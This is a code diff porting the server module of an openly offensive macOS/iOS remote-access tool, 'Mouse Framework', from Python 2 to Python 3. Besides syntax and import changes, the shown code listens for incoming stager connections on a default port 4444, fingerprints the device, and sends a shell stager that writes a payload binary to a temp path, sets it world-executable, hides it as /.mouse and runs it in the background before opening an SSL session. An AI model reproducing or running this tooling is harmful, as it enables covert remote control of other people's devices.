@@ -1,7 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
-#                              Mouse Framework                                 
+#                              Mouse Framework
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -19,10 +19,10 @@
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 import socket, ssl, os, json, sys
-import helper as h
-import session
+from . import helper as h
+from . import session
 import binascii
-from multihandler import MultiHandler
+from .multihandler import MultiHandler
 import time
 
 downloads_dir = "../downloads"
@@ -44,7 +44,7 @@ class Server:
         self.modules_universal = self.import_modules("core/commands/universal")
         self.multihandler = MultiHandler(self)
 
-  
+
     def import_modules(self,path):
         sys.path.append(path)
         modules = dict()
@@ -59,7 +59,7 @@ class Server:
 
 
     def get_modules(self,device_type):
-        if device_type == "macos": 
+        if device_type == "macos":
             result = self.modules_macos
             self.sos = "macOS"
         elif device_type == "iOS":
@@ -72,11 +72,11 @@ class Server:
         try:
             lhost = h.getip()
             lport = None
-            choice = raw_input(h.info_general_raw("Local Host: "))
+            choice = input(h.info_general_raw("Local Host: "))
             if choice != "":
                 lhost = choice
             while True:
-                lport = raw_input(h.info_general_raw("Local Port: "))
+                lport = input(h.info_general_raw("Local Port: "))
                 if not lport:
                     lport = 4444
                 try:
@@ -115,7 +115,7 @@ class Server:
         os.system("printf '\033]2;MultiHandler CLI\a'")
         self.multihandler.start_background_server()
         self.multihandler.interact()
-        print ""
+        print("")
 
 
     def craft_payload(self,device_arch):
@@ -133,7 +133,7 @@ class Server:
             f = open("data/payloads/macos", "rb")
             payload = f.read()
             f.close()
-            #save to tmp, 
+            #save to tmp,
             instructions = \
             "cat >/private/tmp/mouse;"+\
             "chmod 777 /private/tmp/mouse;"+\
@@ -151,7 +151,7 @@ class Server:
             "chmod 777 /tmp/mouse;"+\
             "mv /tmp/mouse /.mouse;"+\
             "/.mouse "+payload_parameter+" 2>/dev/null &\n"
-            self.verbose_print("Executing iOS Payload...") 
+            self.verbose_print("Executing iOS Payload...")
             return (instructions,payload)
         else:
             h.info_error("The device is not recognized!")
@@ -160,7 +160,7 @@ class Server:
     def listen_for_stager(self):
         #craft shell script
         identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
-        
+
         #listen for connection
         s = socket.socket()
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -185,7 +185,7 @@ class Server:
         try:
             bash_stager, executable = self.craft_payload(device_arch)
         except Exception as e:
-            raw_input("Press enter to continue...")
+            input("Press enter to continue...")
             return
         self.debug_print(bash_stager.strip())
         conn.send(bash_stager)
@@ -217,7 +217,7 @@ class Server:
         raw = ssl_sock.recv(256)
         device_info = json.loads(raw)
         return session.Session(self,ssl_sock,device_info)
-        
+
 
     def update_session(self,old_session):
         new_session = self.listen_for_stager()
@@ -225,5 +225,3 @@ class Server:
         old_session.hostname = new_session.hostname
         old_session.username = new_session.username
         old_session.type = new_session.type
-
-   
